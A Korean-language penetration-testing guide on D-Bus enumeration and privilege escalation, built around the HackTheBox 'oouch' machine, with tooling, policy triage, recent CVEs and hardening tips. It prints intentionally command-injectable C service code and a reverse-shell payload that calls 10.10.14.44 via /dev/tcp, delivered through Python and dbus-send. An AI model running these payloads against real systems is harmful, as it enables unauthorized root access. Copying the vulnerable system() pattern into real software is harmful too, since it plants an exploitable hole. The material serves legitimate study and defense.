# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus는 Ubuntu desktop environments에서 inter-process communications (IPC) 중재자로 사용된다. Ubuntu에서는 여러 message buses가 동시에 동작하는데, 주로 **privileged services가 system 전반과 관련된 서비스를 노출하기 위해** 사용하는 system bus와, 로그인한 각 사용자마다 하나씩 존재하는 session bus가 있다. 여기서 주된 초점은 root와 같이 더 높은 privileges로 실행되는 services와 연관되어 있어 권한 상승이 목표이므로 system bus이다. D-Bus의 architecture는 각 session bus에 'router'를 사용하며, 이는 client가 통신하고자 하는 service에 대해 지정한 address를 기반으로 client messages를 적절한 services로 redirect하는 역할을 한다고 알려져 있다.

D-Bus의 services는 노출하는 **objects**와 **interfaces**로 정의된다. Objects는 표준 OOP 언어의 class instances에 비유할 수 있으며, 각 instance는 고유한 **object path**로 식별된다. 이 path는 filesystem path와 유사하며, service가 노출하는 각 object를 고유하게 식별한다. 연구 목적에서 중요한 interface는 **org.freedesktop.DBus.Introspectable** interface로, 단일 method인 Introspect를 가진다. 이 method는 object가 지원하는 methods, signals, properties의 XML representation을 반환하며, 여기서는 properties와 signals는 제외하고 methods에 초점을 맞춘다.

D-Bus interface와 통신하기 위해 두 가지 tool을 사용했다: scripts에서 D-Bus가 노출하는 methods를 쉽게 호출할 수 있는 CLI tool인 **gdbus**, 그리고 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)이다. 이 도구는 Python 기반 GUI tool로, 각 bus에서 사용 가능한 services를 열거하고 각 service에 포함된 objects를 표시하도록 설계되었다.
```bash
sudo apt-get install d-feet
```
세션 bus를 확인하는 경우, 먼저 현재 address를 확인하세요:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

첫 번째 이미지에서는 D-Bus system bus에 등록된 services가 표시되며, System Bus 버튼을 선택한 뒤 **org.debin.apt**가 특히 강조되어 있다. D-Feet는 이 service에 objects를 조회하여, 두 번째 이미지에서 보이듯 선택한 objects의 interfaces, methods, properties, signals를 표시한다. 각 method의 signature도 자세히 나온다.

눈에 띄는 기능은 service의 **process ID (pid)**와 **command line**을 표시한다는 점인데, 이는 service가 권한이 상승된 상태로 실행 중인지 확인하는 데 유용하며, 연구와의 관련성을 판단하는 데 중요하다.

**D-Feet는 method invocation도 허용**한다: 사용자는 parameter로 Python expressions를 입력할 수 있고, D-Feet는 이를 D-Bus types로 변환한 뒤 service에 전달한다.

하지만 **일부 methods는 인증이 필요**하므로, 이를 invoke하기 전에 authentication이 요구될 수 있다는 점에 유의하자. 우리의 목표는 애초에 credentials 없이 권한을 상승시키는 것이므로, 이런 methods는 무시할 것이다.

또한 일부 services는 사용자가 특정 작업을 수행하도록 허용되는지 여부를 org.freedeskto.PolicyKit1라는 다른 D-Bus service에 질의한다는 점도 유의하자.

## **Cmd line Enumeration**

### List Service Objects

다음과 같이 열린 D-Bus interfaces를 나열할 수 있다:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
**`(activatable)`**로 표시된 서비스는 **아직 실행 중이 아니지만**, bus 요청이 들어오면 on demand로 시작될 수 있기 때문에 특히 흥미롭습니다. `busctl list`에서 멈추지 말고, 그런 이름들을 실제로 실행될 binary에 매핑하세요.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
그렇게 하면 activatable name에 대해 어떤 `Exec=` 경로가 시작되고, 어떤 identity로 실행되는지 빠르게 알 수 있습니다. binary 또는 그 execution chain이 제대로 보호되지 않으면, inactive service도 여전히 privilege-escalation path가 될 수 있습니다.

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) 프로세스가 bus에 대한 connection을 설정하면, bus는 그 connection에 특별한 bus name인 _unique connection name_을 할당합니다. 이 유형의 bus name은 immutable합니다—connection이 존재하는 동안 절대 바뀌지 않는 것이 보장되며—더 중요하게는, bus lifetime 동안 재사용될 수 없습니다. 즉, 같은 프로세스가 bus에 대한 connection을 닫고 새 connection을 만들더라도, 그 bus의 다른 어떤 connection도 그런 unique connection name을 할당받지 않습니다. Unique connection names는 보통 앞에, 그렇지 않으면 허용되지 않는, colon 문자 `:`가 붙기 때문에 쉽게 알아볼 수 있습니다.

### Service Object Info

그다음, 다음을 사용해 interface에 대한 일부 정보를 얻을 수 있습니다:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
또한 bus 이름을 해당 `systemd` unit 및 실행 파일 경로와 연결하세요:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
이것은 privesc 중 중요한 운영상 질문에 답합니다: **메서드 호출이 성공하면, 어떤 실제 binary와 unit이 동작을 수행할까?**

### 서비스 Object의 Interface 나열

충분한 permissions이 있어야 합니다.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### 서비스 객체의 Introspect Interface

이 예시에서 `tree` 파라미터를 사용해 발견된 최신 interface가 선택된 점에 주목하라 (_이전 섹션 참조_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
인터페이스 `htb.oouch.Block`의 메서드 `.Block`(우리가 관심 있는 것)을 확인하라. 다른 컬럼의 "s"는 문자열을 기대한다는 의미일 수 있다.

아무것도 위험한 시도를 하기 전에, 먼저 **read-oriented** 또는 그 밖의 저위험 메서드를 검증하라. 이렇게 하면 세 가지 경우를 깔끔하게 구분할 수 있다: 잘못된 syntax, 도달 가능하지만 denied됨, 또는 도달 가능하고 허용됨.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus Methods를 Policies와 Actions와 연관시키기

Introspection은 **무엇을** 호출할 수 있는지는 알려주지만, 호출이 **왜** 허용되거나 거부되는지는 알려주지 않습니다. 실제 privesc triage를 하려면 보통 **세 가지 계층을 함께** 확인해야 합니다:

1. **Activation metadata** (`.service` files 또는 `SystemdService=`)로 실제로 어떤 binary와 unit이 실행되는지 확인합니다.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`)로 누가 `own`, `send_destination`, `receive_sender` 할 수 있는지 확인합니다.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`)로 기본 authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`)을 확인합니다.

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
D-Bus method와 Polkit action 사이에 1:1 매핑을 **가정하지 마세요**. 같은 method라도 수정되는 object나 runtime context에 따라 다른 action을 선택할 수 있습니다. 따라서 실무 workflow는 다음과 같습니다:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` 및 관련 `.policy` 파일에 grep
3. `busctl call`, `gdbus call`, 또는 `dbusmap --enable-probes --null-agent`를 사용한 저위험 live probe

Proxy 또는 compatibility service는 특히 주의가 필요합니다. 자체적으로 미리 설정된 connection을 통해 다른 D-Bus service로 request를 전달하는 **root-running proxy**는, 원래 caller identity가 다시 검증되지 않으면 backend가 모든 request를 UID 0에서 온 것으로 잘못 처리하게 만들 수 있습니다.

### Monitor/Capture Interface

충분한 privileges가 있으면(단, `send_destination`와 `receive_sender` privileges만으로는 부족) **D-Bus communication을 monitor**할 수 있습니다.

**communication을 monitor**하려면 **root**여야 합니다. root인데도 문제가 계속되면 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 및 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)를 확인하세요.

> [!WARNING]
> D-Bus config file을 설정해서 **non root users가 communication을 sniff**할 수 있게 하는 방법을 알고 있다면 **저에게 연락해 주세요**!

monitor하는 다양한 방법:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
다음 예시에서 인터페이스 `htb.oouch.Block`이 모니터링되며, **"**_**lalalalal**_**" 메시지가 오해로 인해 전송됩니다**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
`monitor` 대신 `capture`를 사용하여 Wireshark에서 열 수 있는 **pcapng** 파일에 결과를 저장할 수 있습니다:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### 모든 노이즈 필터링 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

버스에 정보가 너무 많다면, 다음과 같이 match rule을 전달하세요:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
여러 규칙을 지정할 수 있습니다. 메시지가 규칙 중 _any_ 하나라도 일치하면 해당 메시지가 출력됩니다. 예를 들어:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
자세한 내용은 match rule syntax에 대한 [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)를 참조하세요.

### More

`busctl`에는 더 많은 옵션이 있으며, [**모두 여기에서 찾을 수 있습니다**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

HTB의 호스트 "oouch" 안에서 **user qtc**로서, _/etc/dbus-1/system.d/htb.oouch.Block.conf_에 위치한 **예상치 못한 D-Bus config file**을 찾을 수 있습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
이전 설정에 대한 메모: 이 D-BUS communication을 통해 정보를 보내고 받으려면 **root** 또는 **www-data** 사용자여야 합니다.

docker container **aeb4525789d8** 안의 사용자 **qtc**로서, 파일 _/code/oouch/routes.py_에서 dbus 관련 코드를 찾을 수 있습니다. 이것이 흥미로운 코드입니다:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
보시다시피, 이는 **D-Bus interface에 연결**하고 **"Block" 함수**에 "client_ip"를 보내고 있습니다.

D-Bus connection의 반대편에는 컴파일된 C binary가 실행되고 있습니다. 이 코드는 D-Bus connection에서 **IP address를 listening**하고 있으며, 주어진 IP address를 차단하기 위해 `system` function을 통해 iptables를 호출합니다.\
**`system` 호출은 command injection을 위해 의도적으로 vulnerable**하므로, 다음과 같은 payload는 reverse shell을 생성합니다: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

이 페이지의 끝에서 **D-Bus application의 전체 C code**를 찾을 수 있습니다. 그 안에서 91-97행 사이에 **`D-Bus object path`**와 **`interface name`**이 어떻게 등록되는지 찾을 수 있습니다. 이 정보는 D-Bus connection에 정보를 보내는 데 필요합니다:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
또한, 57번째 줄에서 **이 D-Bus communication에 등록된 유일한 method** 가 `Block`이라는 것을 찾을 수 있습니다(_**그래서 다음 섹션에서 payload는 service object `htb.oouch.Block`, interface `/htb/oouch/Block`, 그리고 method name `Block`으로 전송될 것입니다**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

다음 Python 코드는 이전 코드 조각에서 추출된 `_note that it was extracted from the previous chunk of code_` `block_iface.Block(runme)`를 통해 `Block` 메서드로 D-Bus 연결에 payload를 전송합니다:
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl 및 dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send`는 “Message Bus”로 메시지를 보내는 데 사용되는 도구다
- Message Bus – 시스템이 애플리케이션 간 통신을 쉽게 하도록 사용하는 소프트웨어다. Message Queue와 관련이 있지만(메시지가 순서대로 정렬됨), Message Bus에서는 메시지가 subscription model로 전송되며 매우 빠르다.
- “-system” tag는 이것이 session message가 아니라 system message임을 나타내는 데 사용된다(기본값).
- “–print-reply” tag는 메시지를 적절히 출력하고, 모든 reply를 사람이 읽을 수 있는 형식으로 받는 데 사용된다.
- “–dest=Dbus-Interface-Block” Dbus interface의 주소.
- “–string:” – interface로 보내고 싶은 message의 타입이다. double, bytes, booleans, int, objpath처럼 여러 형식의 메시지 전송이 있다. 이 중 “object path”는 Dbus interface에 파일의 path를 보내고 싶을 때 유용하다. 이 경우 특별한 파일(FIFO)을 사용해 파일 이름 형태로 interface에 command를 전달할 수 있다. “string:;” – FIFO reverse shell 파일/command를 놓는 object path를 다시 호출하는 데 사용된다.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

`busctl`/`gdbus`로 대규모 D-Bus attack surface를 수동으로 enumeration하는 것은 금방 힘들어집니다. 지난 몇 년간 출시된 작은 FOSS 유틸리티 2개가 red-team 또는 CTF 진행 중 속도를 크게 높여줄 수 있습니다:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* C로 작성됨; 모든 object path를 순회하고 `Introspect` XML을 가져와 owning PID/UID에 매핑하는 단일 static binary(<50 kB).
* 유용한 flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* 이 도구는 보호되지 않은 well-known name에 `!` 표시를 붙여, 즉시 *own*할 수 있는 서비스(장악 가능) 또는 비권한 shell에서 도달 가능한 method call을 드러냅니다.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* systemd units에서 *writable* path와 과도하게 허용적인 D-Bus policy files(예: `send_destination="*"`)를 찾는 Python 전용 스크립트.
* 빠른 사용법:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus 모듈은 아래 디렉터리를 검색하고, 일반 사용자가 spoof 또는 hijack할 수 있는 모든 service를 강조 표시합니다:
* `/etc/dbus-1/system.d/` 및 `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

최근 공개된 CVE를 주시하면 custom code에서 비슷한 insecure pattern을 찾는 데 도움이 됩니다. 좋은 최근 예시는 2가지입니다:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root로 실행되는 서비스가 비권한 사용자가 재구성할 수 있는 D-Bus interface를 노출했고, 여기에는 attacker-controlled macro behavior 로드도 포함되었습니다. | daemon이 system bus에서 **device/profile/config management**를 노출하면, writable configuration과 macro 기능을 단순한 "settings"가 아니라 code-execution primitive로 취급하세요. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root로 실행되는 compatibility proxy가 원래 caller의 security context를 보존하지 않은 채 요청을 backend services로 전달했고, 그 결과 backend는 proxy를 UID 0으로 신뢰했습니다. | **proxy / bridge / compatibility** D-Bus services를 별도의 bug class로 취급하세요: privileged call을 relay한다면 caller UID/Polkit context가 backend에 어떻게 전달되는지 검증해야 합니다. |

주의해야 할 패턴:
1. Service가 system bus에서 **root로 실행**됩니다.
2. **authorization check가 없거나**, check가 **잘못된 subject**에 대해 수행됩니다.
3. 도달 가능한 method가 결국 system state를 변경합니다: package install, user/group 변경, bootloader config, device profile 업데이트, file write, 또는 직접 command execution.

`dbusmap --enable-probes` 또는 수동 `busctl call`로 method에 도달 가능한지 확인한 다음, service의 policy XML과 Polkit actions를 검토해 **어떤 subject**가 실제로 authorized되는지 파악하세요.

---

## Hardening & Detection Quick-Wins

* world-writable 또는 *send/receive*-open 정책을 검색:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* 위험한 method에는 Polkit를 요구하세요 – *root* proxy라도 자신의 것이 아니라 *caller* PID를 `polkit_authority_check_authorization_sync()`에 전달해야 합니다.
* 장시간 실행되는 helper에서 권한을 낮추세요(bbus에 연결한 뒤 `sd_pid_get_owner_uid()`를 사용해 namespace를 전환).
* service를 제거할 수 없다면, 최소한 전용 Unix group에 *scope*를 제한하고 XML policy에서 접근을 제한하세요.
* Blue-team: `busctl capture > /var/log/dbus_$(date +%F).pcapng`로 system bus를 캡처하고 Wireshark에 import하여 이상 징후를 탐지하세요.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
